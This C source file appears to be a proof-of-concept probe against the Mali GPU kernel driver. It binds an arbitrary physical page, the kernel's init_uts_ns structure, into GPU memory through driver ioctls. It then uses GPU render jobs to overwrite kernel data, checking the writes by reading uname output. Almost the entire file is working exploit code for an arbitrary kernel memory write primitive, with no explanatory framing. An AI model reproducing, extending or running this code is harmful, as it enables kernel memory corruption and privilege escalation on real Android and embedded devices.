/*
 * kort_probe8.c - 全新 GPU VA 落点测试 (排除跨进程 TLB 残留)
 *
 * 关键改动: 用从未绑定过的 VA 0x43000000, 绑定后立即写,
 *           验证写入是否干净/连续/位置正确
 *
 * init_uts_ns @ PA 0x027CDD38 (page 0x027CD000):
 *   sysname @ +0xD38 "Linux"   nodename @ +0xD79 "localhost"
 *   release @ +0xDBA           version  @ +0xDFB
 *
 * E1: 'X' (H=0x20) @ +0xD38 -> sysname 是否连续完整变 X?
 * E2: 'Y' (H=0x20) @ +0xD3C (细粒度) -> sysname = XXXXYYYY?
 * E3: 'Z' (H=0x4)  @ +0xD44 -> H=4 落点
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;
typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;
typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;
typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_SCALE           21
#define FR_FOUREIGHT       22
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define GPU_VA_DATA  0x40000000u
#define BUF_SIZE     0x8000

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};
static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = 0x800,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

static int wb_write_wh(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value,
                       uint32_t w, uint32_t h)
{
    const uint32_t OFF_PLB = 0, OFF_SHADER = 0x80, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0; plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000; plb[4] = 0; plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = w;
    job.frame_registers[FR_HEIGHT]          = h;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = (w * 4 + 64) / 8;
    job.wb0_registers[WB_MRT_BITS]     = 4;
    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;
    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    if (tio(fd, MALI_IOC_PP_START_JOB, &job, 5) != 0) return -1;
    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    if (tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5) != 0) return -2;
    return 0;
}

static volatile char *g_flush = NULL;
static void flush_cpu_cache(void) {
    if (!g_flush) g_flush = mmap(NULL, 8*1024*1024, PROT_READ|PROT_WRITE,
                                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (g_flush == MAP_FAILED) { g_flush = NULL; return; }
    for (size_t i = 0; i < 8*1024*1024; i += 64) g_flush[i] = (char)(i>>6);
}

static void show_uts(const char *tag) {
    struct utsname u;
    if (uname(&u) != 0) { printf("  [%s] uname failed\n", tag); return; }
    printf("  [%s] sys='%-24.24s' node='%-16.16s' rel='%-20.20s' ver='%-16.16s'\n",
           tag, u.sysname, u.nodename, u.release, u.version);
}

int main(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_probe8 - FRESH GPU VA landing test (0x43000000)\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE; alloc.psize = BUF_SIZE;
    if (tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) { printf("[-] alloc\n"); return 1; }
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); return 1; }
    flush_cpu_cache();

    const uint32_t VA = 0x43000000;   /* 全新, 从未绑定过 */
    if (bind_phys(fd, 0x027CD000u, VA, 0x1000) != 0) {
        printf("[-] bind\n"); return 1;
    }
    printf("[+] BIND uts page -> FRESH VA 0x%x\n", VA);
    show_uts("initial");

    printf("\n[E1] H=0x20 @ +0xD38 (sysname) val='X'\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD38, 0x58585858, 0x10, 0x20);
    flush_cpu_cache();
    show_uts("E1");

    printf("\n[E2] H=0x20 @ +0xD3C val='Y' (fine-grain)\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD3C, 0x59595959, 0x10, 0x20);
    flush_cpu_cache();
    show_uts("E2");

    printf("\n[E3] H=0x4 @ +0xD44 val='Z'\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD44, 0x5A5A5A5A, 0x10, 0x4);
    flush_cpu_cache();
    show_uts("E3");

    printf("\n[*] done (reboot to restore)\n");
    munmap(buf, BUF_SIZE);
    close(fd);
    return 0;
}
